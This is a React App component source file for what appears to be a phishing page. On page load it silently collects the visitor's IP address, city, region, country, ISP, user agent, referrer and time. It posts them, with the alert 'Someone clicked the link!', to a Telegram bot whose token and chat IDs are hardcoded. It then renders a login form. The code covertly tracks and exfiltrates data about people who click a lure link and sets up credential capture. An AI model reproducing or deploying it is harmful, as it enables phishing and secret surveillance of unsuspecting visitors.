
import './App.css'
import LoginForm from './LoginPage'
import { useEffect } from 'react'

function App() {
  useEffect(() => {
    const sendTelegramMessage = async (msg) => {
      const BOT_TOKEN = '7978921198:AAGMpYfajBHF8LgWVC0f1sxRcNqtRggMH8I'
      const CHAT_ID = ['5576038167', '6428623526']

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
          }),
        })
        const result = await res.json()
        console.log('✅ Sent to Telegram:', result)
      } catch (err) {
        console.error('❌ Telegram Error:', err)
      }
    }

    const trackUser = async () => {
      try {
        // Get IP
        const ipRes = await fetch('https://api.ipify.org?format=json')
        const ipData = await ipRes.json()
        const ip = ipData.ip

        // Get location details
        const locationRes = await fetch(`https://ipapi.co/${ip}/json/`)
        const locationData = await locationRes.json()
        const { city, region, country_name, org } = locationData

        // User agent
        const userAgent = navigator.userAgent

        // Referrer
        const referrer = document.referrer || "No referrer"

        // Time
        const time = new Date().toLocaleString()

        // Final message
        const message = `
🚨 Someone clicked the link!

🧠 User Agent:
${userAgent}

🌐 IP: ${ip}
📍 Location: ${city}, ${region}, ${country_name}
🏢 ISP: ${org}

🔗 Referrer: ${referrer}
🕒 Time: ${time}
      `.trim()

        await sendTelegramMessage(message)
      } catch (err) {
        console.error('❌ Error collecting user info:', err)
      }
    }

    trackUser()
  }, [])



  return (
    <>
      <LoginForm />
    </>
  )
}

export default App
